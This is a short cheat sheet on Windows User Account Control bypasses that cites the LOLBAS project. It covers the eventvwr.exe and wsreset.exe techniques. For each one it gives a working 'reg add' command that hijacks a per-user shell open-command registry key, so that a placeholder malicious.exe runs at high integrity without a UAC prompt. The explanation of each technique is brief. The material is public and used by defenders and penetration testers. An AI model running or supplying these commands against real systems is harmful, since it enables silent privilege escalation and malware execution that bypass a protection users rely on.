# User Access Controls Bypass
1. eventvwr.exe
https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/#uac%20bypass

Prep: 
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /d %tmp%\malicious.exe /f
```
During startup, eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.
```
HKCU\Software\Classes\mscfile\shell\open\command
```

2. wsreset.exe
https://lolbas-project.github.io/lolbas/Binaries/Wsreset/#uac%20bypass

Prep: 
```
reg add HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command /d %tmp%\malicious.exe /f
```
During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.
```
HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
```



